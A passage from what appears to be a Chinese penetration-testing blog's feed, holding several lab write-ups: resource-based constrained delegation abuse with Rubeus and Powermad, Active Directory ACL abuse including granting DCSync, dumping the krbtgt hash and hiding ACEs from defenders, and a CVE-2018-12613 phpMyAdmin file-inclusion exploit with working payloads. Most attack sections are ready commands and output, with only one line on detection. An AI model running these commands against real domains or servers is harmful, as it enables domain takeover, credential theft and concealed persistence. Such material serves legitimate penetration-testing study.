(域内主机)</p><p>用到的工具：</p><ul><li>powerview</li><li>Powermad</li><li>Rubeus</li><li>mimikatz</li><li>impacket工具套件</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先进行ACL权限检测，当前域用户是否有权限创建新的计算机。能利用的ACL为<br>（GenericAll/GenericWrite/WriteProperty）</p><pre><code>import-Module Powerview.ps1Get-ObjectAcl -SamAccountName &quot;YYC&quot; -ResolveGUIDs | out-file save.txt #搜索自己的UID和搜索关键字GenericAll/GenericWrite/WriteProperty</code></pre><p>拥有其中一个ACL权限即可<br><img src="https://s1.ax1x.com/2020/08/03/adfjqx.png" alt=""></p><p>获取域控名称和ip(确定域控版本和系统)</p><pre><code>Get-DomainController</code></pre><p><img src="https://s1.ax1x.com/2020/08/03/adhkQA.png" alt=""></p><p>查询一个域用户最多可以创建多少台计算机</p><pre><code>Get-DomainObject -Identity &quot;dc=YAYI,dc=local&quot; -Domain YAYI.local</code></pre><p><img src="https://s1.ax1x.com/2020/08/03/adhQzj.png" alt=""></p><p>查询目标机的msds-allowedtoactonbehalfofotheridentity是否被写入</p><pre><code>Get-NetComputer YYC | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/adh0SJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/adh6w6.png" alt=""></p><p>创建一个计算机用户</p><pre><code>import-module powermadNew-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString &#39;123456&#39; -AsPlainText -Force) -Verbose #新建一个计算机账户，密码为123456。</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/adh4ld.png" alt=""></p><p>查询新创建的计算机用户的SID</p><pre><code>Get-DomainComputer fake01</code></pre><p>SID:S-1-5-21-2210433587-4071140994-1849857373-1122<br><img src="https://s1.ax1x.com/2020/08/04/adhLtS.png" alt=""></p><p>为FAKE01计算机主体创建一个新的原始安全描述符</p><pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)&quot;$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)</code></pre><p>(实验的时候打错SID了就不贴图了)</p><p>修改目标计算机SID</p><pre><code>Get-DomainComputer YYC | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose</code></pre><p>忘记截图了，拿文章的图代替一下。。<br><img src="https://s1.ax1x.com/2020/08/04/ad4aHP.png" alt=""></p><p>提醒-我们之所以能够这样写，是因为Account Operators于安全组进YAYI\Account Operators，尽管唯一重要的/足够的是写权限，但它可以完全控制目标计算机YYC$<br>（原文写的是 Operations用户，不过我找不到这个。到找到了Account Operations）<br><img src="https://s1.ax1x.com/2020/08/04/ad4r9g.png" alt=""></p><p>自己实现时找到的<br><img src="https://s1.ax1x.com/2020/08/04/ad42Bq.png" alt=""></p><p>一旦msds允许作为其他身份被设置，它在这里是可见的<br><img src="https://s1.ax1x.com/2020/08/04/ad4ICF.png" alt=""></p><p>同样的道理也可以这样看</p><pre><code>Get-DomainComputer YYC -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39;</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad4qD1.png" alt=""></p><p>配置FAKE01的机器绑定到YYC的机器</p><pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2210433587-4071140994-1849857373-1122)&quot; #这里的SID为新加的计算机账户的SID$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer YYC| Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5S8e.png" alt=""></p><p>获取hash</p><pre><code>.\Rubeus.exe hash /password:123456 /user:fake01 /domain:YAYI.local</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5pgH.png" alt=""></p><p>RC4 hash：<strong>32ED87BDB5FDC5E9CBA88547376818D4</strong></p><p>伪造域管理员的凭证导入 （这个凭证只能在YYC上使用）</p><pre><code>.\Rubeus.exe s4u /user:fake01$ /domain:YAYI.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:yayis /msdsspn:host/YYC /altservice:cifs,host /ptt #导入cifs和host的票据，不导入host票据无法正常使用spexec ?(host票据包含cifs票据)</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5UxJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/ad5dM9.png" alt=""></p><p>如果要在别的机子上使用kerberos的凭证，则需要impacket的pyGet.py或者mimikatz导出ccache</p><pre><code>mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5sIK.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/ad5gRe.png" alt=""></p><p>导入凭证利用，可以使用mimikatz或者set命令</p><pre><code>mimikatz &quot;kerberos::ptc yayis.ccache&quot; &quot;exit&quot;使用set命令，set KRB5CCNAME=yayis.ccache</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5hqI.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/ad55Zt.png" alt=""></p><p>其实后面还有一点，这个复现的不是很成功。后面的内容有点乱，写出来容易搞混，就不写了<br>上面提到的ACL一台机器使用域用户连接DC的时候就已经把ACL设置留下来了。我觉得使用powerview<br>对着每台机器查有权限控制这台机器的SID,可以横着走。（纯属理论，实际上有待测验）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object</a></p><p><a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://422926799.github.io/tags/内网渗透/"/>
    
  </entry>
  
  <entry>
    <title>AD域里的ACL攻防</title>
    <link href="http://422926799.github.io/posts/be9dae0a.html"/>
    <id>http://422926799.github.io/posts/be9dae0a.html</id>
    <published>2020-08-02T08:39:09.000Z</published>
    <updated>2020-08-02T09:44:13.437Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe><p>最近文章都写星球了，所以没怎么更新。昨天看到了安全客一篇说AD域里的ACL攻防<br>学习到了，写篇文章更新一下<br>原文地址：<a href="https://www.anquanke.com/post/id/212163#h3-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163#h3-19</a><br><strong>注意：有些图和文字来自安全客</strong></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>首先想要了解ACL首先需要了解Access Control Model（访问控制模型），根据官网（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：</a><br>访问控制模型能够控制进程访问一些安全对象，或者是控制进程执行各种系统管理任务。原文：The access control model enables you to control the ability of a process to access securable objects or to perform various system administration tasks。<br>用通俗一点的话来说ACM就是一个判断你在一个档案馆（在这里可以理解为整个域）里是否有权限打开某个档案抽屉（用户对象、用户组对象、Computer对象），并且是否能在这个档案抽屉中取走、存放、修改档案（读、写、修改）的一个模型。</p></blockquote><p>访问模型包含哪些部分：<br>1、Access Tokens（访问tokens）<br>2、Security Descriptors（安全描述符）<br>a、Discretionary Access Control List (DACL)<br>b、System Access Control List (SACL)<br>Access Control Lists（ACL）<br>Access Control Entries（ACE）<br>Access Rights and Access Masks（访问权限和访问掩码）</p><p><strong>Access Token</strong><br>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包括用户的SID、所在组的SID等等信息</p><p><strong>Security Descriptors安全描述符</strong><br>SID（Security Identifiers）即安全描述符。<br>安全描述符标识对象的所有者，并包含以下访问控制列表：<br>1、Discretionary Access Control List (DACL) 自由访问控制列表<br>2、System Access Control List (SACL) 系统访问控制列表</p><p>每一种控制列表中都存在若干条ACE（Access Control Entries）<br><img src="https://s1.ax1x.com/2020/08/02/aYyOMQ.png" alt=""></p><p>一张图描述<br><img src="https://s1.ax1x.com/2020/08/02/aY6PRU.png" alt=""></p><h2 id="DACL"><a href="#DACL" class="headerlink" title="DACL"></a>DACL</h2><p>高级安全设置中的权限就是DACL的列表<br><img src="https://s1.ax1x.com/2020/08/02/aY61Qe.png" alt=""></p><h2 id="SACL"><a href="#SACL" class="headerlink" title="SACL"></a>SACL</h2><p>高级安全设置中的审核就是SACL的列表<br><img src="https://s1.ax1x.com/2020/08/02/aY62F0.png" alt=""></p><p>其中红色圈出来的每一条都是一条ACE</p><h2 id="ACE"><a href="#ACE" class="headerlink" title="ACE"></a>ACE</h2><p>ACE是针对特定用户或特定组的单个权限授予（或拒绝权利）的配置结构。ACE有许多不同类型，但是在Active Directory的权限中，只有四种不同的含义，两种分别用于授予和拒绝权限。</p><h2 id="Access-Mask"><a href="#Access-Mask" class="headerlink" title="Access Mask"></a>Access Mask</h2><p>Access Mask在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限，比如完全控制（GenericAll）、修改密码（ResetPassword）、写入属性（WriteMembers）等等。<br><img src="https://s1.ax1x.com/2020/08/02/aYc90A.png" alt=""></p><h2 id="TrusteesTrustees"><a href="#TrusteesTrustees" class="headerlink" title="TrusteesTrustees"></a>TrusteesTrustees</h2><p>TrusteesTrustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。比如下面这一条的受委托人实际上就是zhangs账号。<br><img src="https://s1.ax1x.com/2020/08/02/aYcEp8.png" alt=""></p><h2 id="AD域里常见可利用的ACl"><a href="#AD域里常见可利用的ACl" class="headerlink" title="AD域里常见可利用的ACl"></a>AD域里常见可利用的ACl</h2><ul><li>GenericAll ：拥有一个可以完全控制用户/组的权限</li><li>GenericWrite ：此权限能够更新目标对象的属性值</li><li>Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</li><li>WriteProperty ：WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限</li><li>WriteOwner ：WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限</li><li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</li></ul><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><p>ADSI编辑器<br>powerview</p><h2 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h2><p><strong>GenericAll on User</strong><br>使用powerview添加ACL或者手动</p><pre><code class="text">Add-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity yayi -Rights All -Verbose</code></pre><p>这个权限可以完全控制用户<br><img src="https://s1.ax1x.com/2020/08/02/aY2ELQ.png" alt=""></p><p>给予了yayi对zhangs用户完全控制的权限，在查看zhangs的时候可以发现yayi的SID在查询里出现了<br><img src="https://s1.ax1x.com/2020/08/02/aY2MWV.png" alt=""></p><p>此时使用yayi的用户可以修改zhangs用户密码<br><img src="https://s1.ax1x.com/2020/08/02/aY21QU.png" alt=""></p><p><strong>GenericAll on Group</strong><br>环境和上文相同，GenericAll on Group说的是对一个组有GenericAll权限，查看用户组domain admins：<br>（yayi是新增加的）<br><img src="https://s1.ax1x.com/2020/08/02/aY2BQO.md.png" alt=""></p><p>powerview将yayi用户添加到domain admins用户添加</p><pre><code class="text">Add-DomainObjectAcl  -TargetIdentity &quot;domain admins&quot; -PrincipalIdentity yayi -Rights  all -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aY22FI.png" alt=""></p><p>添加yayi用户的ACL全部控制权限后查看<br><img src="https://s1.ax1x.com/2020/08/02/aY24l8.png" alt=""></p><p>可以用yayi用户控制domain admins用户组<br><img src="https://s1.ax1x.com/2020/08/02/aY5TmT.png" alt=""></p><h2 id="GenericWrite-写入全部属性"><a href="#GenericWrite-写入全部属性" class="headerlink" title="GenericWrite (写入全部属性)"></a>GenericWrite (写入全部属性)</h2><p>GenericWrite也是在Access Mask中进行标识，此权限能够更新目标对象的属性值，可以使用PowerView中的Set-DomainObject方法设置目标属性的值。<br><img src="https://s1.ax1x.com/2020/08/02/aY5Oh9.png" alt=""></p><blockquote><p>如果您在计算机对象上具有这些特权，那么您可以拉出Kerberos基于资源的受限委托:计算机对象接管。<br>参考链接：<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></p></blockquote><p>修改别的属性</p><pre><code>Set-DomainObject zhangs -Set @{&#39;scriptPath&#39;=&#39;雷电芽衣&#39;} -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYop2n.png" alt=""></p><h2 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h2><p>WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。<br><img src="https://s1.ax1x.com/2020/08/02/aYoGIe.png" alt=""></p><p>个人感觉WriteDacl和GenericWrite没什么区别</p><pre><code>Set-DomainObject zhangs -Set @{&#39;scriptPath&#39;=&#39;雷电女王&#39;} -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYodMt.png" alt=""></p><h2 id="Self-Membership"><a href="#Self-Membership" class="headerlink" title="Self-Membership"></a>Self-Membership</h2><p>这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)<br>重点：主体、添加/删除自身作为成员</p><p><img src="https://s1.ax1x.com/2020/08/02/aYohLV.png" alt=""></p><p>此时查看dnsadmins用户组可以看到test用户的sid在dnsadmins里看到了<br><img src="https://s1.ax1x.com/2020/08/02/aYoHJJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/02/aYoqzR.png" alt=""></p><h2 id="WriteProperty-Self-Membership"><a href="#WriteProperty-Self-Membership" class="headerlink" title="WriteProperty (Self-Membership)"></a>WriteProperty (Self-Membership)</h2><p>WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限<br>WriteProperty和Self-Membership一样 (设置的地方一模一样或者直接设置权限为：添加/删除自身作为成员)<br>（也可以添加其他用户进控制的组）</p><p><img src="https://s1.ax1x.com/2020/08/02/aYT9Fe.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/02/aYTkQI.md.png" alt=""></p><h2 id="WriteProperty-on-Group"><a href="#WriteProperty-on-Group" class="headerlink" title="WriteProperty on Group"></a>WriteProperty on Group</h2><p>WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限：<br>CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner<br>设置一个组的写入全部属性<br>（相当于获取了这个组的所有权限）<br><img src="https://s1.ax1x.com/2020/08/02/aYT8O0.png" alt=""></p><h2 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h2><p>WriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A能利用这个权限给自己附加其他的权限。</p><p>将zhangs用户的所有者设置为test，并给予test用户完全的控制权限</p><pre><code>Set-DomainObjectOwner -Identity S-1-5-21-447451162-2905414466-2158217208-1149 -OwnerIdentity &quot;test&quot; -VerboseAdd-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity test -Rights All -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYT0p9.png" alt=""></p><h2 id="给一个用户添加DCSync权限"><a href="#给一个用户添加DCSync权限" class="headerlink" title="给一个用户添加DCSync权限"></a>给一个用户添加DCSync权限</h2><p>给予test用户：复制目录更改Replicating Directory Changes (DS-Replication-Get-Changes)、 复制目录更改所有Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange用的就是这个）权限</p><pre><code>Add-DomainObjectAcl -TargetIdentity &quot;DC=DOMAIN,DC=local&quot; -PrincipalIdentity test -Rights DCSync</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYT70f.png" alt=""></p><p>使用mimikatz导出krbtgt用户的hash</p><pre><code>mimikatz.exe &quot;lsadump::dcsync /user:DOMAIN\krbtgt&quot; &quot;exit&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aY7pn0.png" alt=""></p><p><strong>Invoke-ACLPwn</strong><br>运行时需要.NET 3.5环境，Windows Server 2012安装遇到报错，最后的解决方法(需要在网上下载SxS的安装包<a href="https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：</a></p><p>dism.exe /online /enable-feature /all /featurename:NetFX3 /Source:F:\Sources\SxS\</p><p>GitHub地址：<a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a><br>背景信息在发布者博客上：<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a><br>环境需要：</p><p>.NET 3.5 + sharphound.exe + mimikatz.exe</p><p>用法示例：</p><pre><code>.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn &#39;Administrator&#39;.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username &#39;testuser&#39; -Domain &#39;xenoflux.local&#39; -Password &#39;Welcome01!&#39;</code></pre><p>使用第一条标识了-NoDCSync（不会做DCSync的动作，只判断是否能够存在能够DCSync的权限）的命令<br>administrator用户检测出来了其他用户报错<br><img src="https://s1.ax1x.com/2020/08/02/aY7uB6.png" alt=""></p><p>文章上的图<br><img src="https://s1.ax1x.com/2020/08/02/aY7Lb6.png" alt=""></p><h2 id="针对DACL的隐身方式"><a href="#针对DACL的隐身方式" class="headerlink" title="针对DACL的隐身方式"></a>针对DACL的隐身方式</h2><p>通过隐藏账户可以掩盖主体本身，阻止防御者轻易的发现谁实际上拥有ACE中指定的权限。这种方式主要应对的是对于高危的ACL进行扫描行为。<br>隐藏用户</p><p>1、将要隐藏的用户所有者改为攻击者或者攻击者控制的账户<br>2、设置一条拒绝完全控制的ACE<br>添加SELF用户和Everyone用户拒绝类型，将要修改的组/用户名的所有者改为攻击者控制的用户名<br><img src="https://s1.ax1x.com/2020/08/02/aYHgRH.png" alt=""><br>之后就会变成一片空白,powerview也查不到</p><pre><code>Get-DomainObjectAcl -Identity user01 -domain DOMAIN.local -Resolve</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYblSH.md.png" alt=""></p><h2 id="各种ACL后门"><a href="#各种ACL后门" class="headerlink" title="各种ACL后门"></a>各种ACL后门</h2><pre><code>* GPO ACL后门* ACL Dcsync后门</code></pre><p>具体参考文章</p><h2 id="防御ACL修改"><a href="#防御ACL修改" class="headerlink" title="防御ACL修改"></a>防御ACL修改</h2><p>关注日志里的5136事件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/212163#h3-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163#h3-19</a><br><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://422926799.github.io/tags/内网渗透/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12613phpmyadmin本地文件包含复现</title>
    <link href="http://422926799.github.io/posts/299f8a4a.html"/>
    <id>http://422926799.github.io/posts/299f8a4a.html</id>
    <published>2020-07-21T12:26:18.000Z</published>
    <updated>2020-07-21T12:46:44.917Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到某文章提到了，最近在学代码审计顺便看看<br>漏洞影响</p><ul><li>4.8.0</li><li>4.8.0.1</li><li>4.8.1</li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpmyadmin 4.8.1<br>这里直接用的靶场<a href="https://store.vsplate.com/" target="_blank" rel="noopener">https://store.vsplate.com/</a></p><h2 id="代码刨析"><a href="#代码刨析" class="headerlink" title="代码刨析"></a>代码刨析</h2><p>问题出现在index.php第61行<br>(index.php 55行~63行)</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;]; //问题出现在这    exit;}</code></pre><p>这段代码的内容为：</p><ul><li>$_REQUEST[‘target’]参数为字符串类型</li><li>$_REQUEST[‘target’]参数不存在index关键字</li><li>$_REQUEST[‘target’]参数不存在黑名单$target_blacklist</li><li>checkPageValidity函数返回True</li></ul><p>checkPageValidity函数代码<br>(Core.php 443~476行)</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist; //白名单    }    if (! isset($page) || !is_string($page)) { //$page参数不存在，不是string类型        return false;    }    if (in_array($page, $whitelist)) { //$page参数在白名单里 （无法利用，没对$page参数做任何取值判断）        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    ); //取第一个字符到?号前一个位置的内容    if (in_array($_page, $whitelist)) { //$page里面的参数是否在白名单内 （无法利用，$page参数带?就会被php认为php里的参数）        return true;    }    $_page = urldecode($page); //url解码    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    ); //取第一个字符到?号前一个位置的内容    if (in_array($_page, $whitelist)) { //url解码后判断$page里面的参数是否在白名单内 （可以利用，因为url编码绕过了上面所描述的问题）        return true;    }    return false;}</code></pre><p>白名单</p><pre><code class="php">public static $goto_whitelist = array(    &#39;db_datadict.php&#39;,    &#39;db_sql.php&#39;,    &#39;db_events.php&#39;,    &#39;db_export.php&#39;,    &#39;db_importdocsql.php&#39;,    &#39;db_multi_table_query.php&#39;,    &#39;db_structure.php&#39;,    &#39;db_import.php&#39;,    &#39;db_operations.php&#39;,    &#39;db_search.php&#39;,    &#39;db_routines.php&#39;,    &#39;export.php&#39;,    &#39;import.php&#39;,    &#39;index.php&#39;,    &#39;pdf_pages.php&#39;,    &#39;pdf_schema.php&#39;,    &#39;server_binlog.php&#39;,    &#39;server_collations.php&#39;,    &#39;server_databases.php&#39;,    &#39;server_engines.php&#39;,    &#39;server_export.php&#39;,    &#39;server_import.php&#39;,    &#39;server_privileges.php&#39;,    &#39;server_sql.php&#39;,    &#39;server_status.php&#39;,    &#39;server_status_advisor.php&#39;,    &#39;server_status_monitor.php&#39;,    &#39;server_status_queries.php&#39;,    &#39;server_status_variables.php&#39;,    &#39;server_variables.php&#39;,    &#39;sql.php&#39;,    &#39;tbl_addfield.php&#39;,    &#39;tbl_change.php&#39;,    &#39;tbl_create.php&#39;,    &#39;tbl_import.php&#39;,    &#39;tbl_indexes.php&#39;,    &#39;tbl_sql.php&#39;,    &#39;tbl_export.php&#39;,    &#39;tbl_operations.php&#39;,    &#39;tbl_structure.php&#39;,    &#39;tbl_relation.php&#39;,    &#39;tbl_replace.php&#39;,    &#39;tbl_row_action.php&#39;,    &#39;tbl_select.php&#39;,    &#39;tbl_zoom_select.php&#39;,    &#39;transformation_overview.php&#39;,    &#39;transformation_wrapper.php&#39;,    &#39;user_password.php&#39;,);</code></pre><p>利用的payload</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd当解析到/../../../../../../../../etc/passwd会进行包含，实现利用</code></pre><p>验证是否存在包含</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojReJ.png" alt=""></p><p>利用session文件getshell （方法有很多）<br>（在cookie找到phpmyadmin参数）</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_01876fad4b7e3596a65aa96048b99def #有些是/tmp路径有些是别的路径被这个坑的老惨了</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojIW6.png" alt=""></p><p>新版phpmyadmin修复代码</p><pre><code class="php">if (isset($GLOBALS[&#39;target&#39;]) &amp;&amp; is_string($GLOBALS[&#39;target&#39;]) &amp;&amp; !empty($GLOBALS[&#39;target&#39;]) &amp;&amp; in_array($GLOBALS[&#39;target&#39;], $goto_whitelist)) {    $main_target = $GLOBALS[&#39;target&#39;];}</code></pre><p>参考链接：<a href="https://blog.csdn.net/qq_34444097/article/details/85264686" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/85264686</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看到某文章提到了，最近在学代码审计顺便看看&lt;br&gt;漏洞影响&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4.8.0&lt;/li&gt;
&lt;li&gt;4.8.0.1&lt;/li&gt;
&lt;li&gt;4.8.1&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>最简单的方法更改jar包(修改冰蝎)</title>
    <link href="http://422926799.github.io/posts/44a65413.html"/>
    <id>http://422926799.github.io/posts/44a65413.html</id>
    <published>2020-07-14T03:54:07.000Z</published>
    <updated>2020-07-14T04:49:29.597Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" 